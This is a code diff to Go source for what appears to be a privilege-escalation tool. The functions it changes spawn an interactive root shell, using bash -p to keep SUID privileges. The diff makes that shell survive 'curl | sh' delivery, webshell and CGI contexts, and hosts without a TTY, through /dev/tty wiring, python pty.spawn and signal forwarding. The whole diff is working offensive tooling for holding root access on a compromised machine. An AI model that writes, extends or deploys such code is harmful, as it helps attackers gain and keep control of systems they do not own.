@@ -240,7 +240,9 @@ func markerRooted() bool {
 // /dev/tty so the shell stays alive and interactive even when the runner
 // itself was launched via `curl | sh` (whose stdin is a closed pipe).
 //
-// Returns true if a shell was actually spawned.
+// Returns true if a shell was actually spawned (regardless of whether the
+// host had a TTY — on a no-TTY host we still exec the shell so the user can
+// run it manually, and we report that).
 func rootspawn(r *runResult) bool {
 	var shellPath string
 	var shellArgs []string
@@ -254,9 +256,14 @@ func rootspawn(r *runResult) bool {
 			break
 		}
 	}
-	// If the runner itself is root, use a plain shell.
+	// If the runner itself is root, use a plain shell. Prefer bash for
+	// the SUID-style -p semantics, fall back to sh.
 	if shellPath == "" && isRootNow() {
-		shellPath = "/bin/sh"
+		if hasBin("bash") {
+			shellPath = "/bin/bash"
+		} else {
+			shellPath = "/bin/sh"
+		}
 		shellArgs = []string{"-p"}
 	}
 	if shellPath == "" {
@@ -268,56 +275,104 @@ func rootspawn(r *runResult) bool {
 	fmt.Println(strings.Repeat("=", 60))
 
 	// Attach a PTY so the shell behaves like a real terminal and stays
-	// alive for interactive input.
+	// alive for interactive input. spawnPTY handles all three launch
+	// contexts: interactive TTY, curl|sh (closed stdin pipe), and
+	// no-TTY hosts (it falls back to a non-interactive exec + hint).
 	spawnPTY(shellPath, shellArgs...)
 
 	fmt.Println(strings.Repeat("=", 60))
 	return true
 }
 
-// spawnPTY runs a command with stdin/stdout/stderr wired to /dev/tty
-// directly (bypassing any inherited pipe from `curl | sh`). We open
-// /dev/tty explicitly so the shell reads from the controlling terminal
-// of the *user session*, not the closed stdin pipe.
+// spawnPTY runs a command as an interactive shell wired to a real
+// terminal. It must work in ALL three launch contexts:
+//
+//  1. Interactive TTY  — the runner was launched from a real shell.
+//  2. curl|sh           — stdin is the closed download pipe, but the
+//                          user's terminal is still reachable via /dev/tty.
+//  3. No-TTY host       — CGI/webshell/nohup/cron: there is no controlling
+//                          terminal at all. /dev/tty fails with ENXIO.
+//
+// The fundamental bug this fixes: under curl|sh the runner's os.Stdin is a
+// CLOSED pipe. If we hand that to the shell (directly, or via python's
+// pty.spawn which forwards fd 0 to the pty), the shell reads EOF instantly
+// and exits with code 0 — so the user never gets a prompt. The fix is to
+// open /dev/tty for ALL three standard fds so the shell talks to the real
+// user terminal, not the dead pipe. On a no-TTY host we fall back to a
+// non-interactive exec and print a clear hint with the SUID path.
 func spawnPTY(bin string, args ...string) {
-	// 1. Try a real PTY via python3 (most portable across Linux distros).
-	if hasBin("python3") {
-		c := exec.Command("python3", "-c",
-			fmt.Sprintf(
-				"import pty,os,sys;sys.exit(pty.spawn([%s]+%v))",
-				quotePy(bin), pyArgs(args)))
-		c.Stdin = os.Stdin
-		c.Stdout = os.Stdout
-		c.Stderr = os.Stderr
-		// Wire stdin to /dev/tty in case our stdin is a pipe.
-		if f, err := os.Open("/dev/tty"); err == nil {
-			c.Stdin = f
-			defer f.Close()
-		}
-		_ = c.Run()
-		return
-	}
+	// Try to open the controlling terminal. This succeeds in contexts 1
+	// and 2 (the user's terminal exists even when stdin is a pipe) and
+	// fails with ENXIO in context 3.
+	tty, ttyErr := os.OpenFile("/dev/tty", os.O_RDWR, 0)
 
-	// 2. Fallback: raw exec with /dev/tty on all three std fds.
-	tty, err := os.OpenFile("/dev/tty", os.O_RDWR, 0)
-	if err != nil {
-		// No tty available — just run with whatever we have.
+	// ── Context 3: no controlling terminal at all ──────────────────────
+	// We cannot make an interactive shell without a terminal. Fall back
+	// to a non-interactive exec so the user at least gets *a* shell (they
+	// can pipe commands in), and print a clear hint with the SUID path
+	// so they can re-run it from a real terminal.
+	if ttyErr != nil {
+		warnf("/dev/tty unavailable (%v) — no interactive terminal", ttyErr)
+		infof("Run this from a real terminal to get an interactive root shell:")
+		fmt.Printf("    %s %s\n", bin, strings.Join(args, " "))
+		fmt.Println(strings.Repeat("-", 60))
 		c := exec.Command(bin, args...)
+		// Inherit whatever std fds we have. Under curl|sh stdin is a
+		// closed pipe → the shell reads EOF and exits; that's the best
+		// we can do without a tty. Under a webshell stdin may be a live
+		// socket → the shell is usable.
 		c.Stdin = os.Stdin
 		c.Stdout = os.Stdout
 		c.Stderr = os.Stderr
+		// Do NOT Setpgid here — the shell must stay in the foreground
+		// process group of whatever terminal/session it does have, or
+		// it will get SIGTTIN on read and hang.
 		_ = c.Run()
 		return
 	}
 	defer tty.Close()
+
+	// ── Contexts 1 & 2: we have a controlling terminal ────────────────
+	// Prefer a real PTY via python3. pty.spawn does setsid+tcsetpgrp
+	// internally so the child becomes the terminal's foreground process
+	// group — this is what makes job control, Ctrl-C, and line editing
+	// work. We wire python's OWN fd 0/1/2 to /dev/tty (not os.Stdin,
+	// which may be the dead curl pipe) so pty._copy forwards real
+	// terminal I/O to the pty master.
+	if hasBin("python3") {
+		c := exec.Command("python3", "-c",
+			fmt.Sprintf(
+				"import pty,os,sys;sys.exit(pty.spawn([%s]+%s))",
+				quotePy(bin), pyArgs(args)))
+		// Wire ALL three fds to /dev/tty. This is the fix for curl|sh:
+		// python's stdin becomes /dev/tty (the live terminal), not the
+		// closed download pipe, so pty._copy reads real keystrokes and
+		// forwards them to the shell instead of hitting EOF instantly.
+		c.Stdin = tty
+		c.Stdout = tty
+		c.Stderr = tty
+		if err := c.Run(); err == nil {
+			return
+		}
+		// If python3 failed (e.g. pty module unavailable on a stripped
+		// box), fall through to the raw exec path below.
+	}
+
+	// ── Raw exec fallback (no python3, or python3 pty failed) ─────────
+	// Run the shell with all three fds wired to /dev/tty. We do NOT use
+	// Setpgid here: putting the shell in a new process group would make
+	// it NOT the terminal's foreground pgid, so reads from /dev/tty would
+	// deliver SIGTTIN and kill/hang the shell. By inheriting the runner's
+	// session and foreground pgid, the shell can read the terminal
+	// directly. (We lose Ctrl-C isolation, but interactivity is the
+	// priority — the user asked for an interactive root shell.)
 	c := exec.Command(bin, args...)
 	c.Stdin = tty
 	c.Stdout = tty
 	c.Stderr = tty
-	c.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
-	// Forward terminal signals to the child's process group, then stop
-	// intercepting once the child exits so we don't leak the goroutine
-	// or swallow Ctrl-C for the rest of the runner's lifetime.
+	// Forward terminal signals to the child so Ctrl-C still works, then
+	// stop intercepting once the child exits so we don't leak the
+	// goroutine or swallow signals for the rest of the runner's lifetime.
 	ch := make(chan os.Signal, 1)
 	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
 	done := make(chan struct{})
@@ -328,9 +383,7 @@ func spawnPTY(bin string, args ...string) {
 				return
 			case sig := <-ch:
 				if c.Process != nil {
-					if pgid, err := syscall.Getpgid(c.Process.Pid); err == nil {
-						_ = syscall.Kill(-pgid, sig.(syscall.Signal))
-					}
+					_ = syscall.Kill(c.Process.Pid, sig.(syscall.Signal))
 				}
 			}
 		}
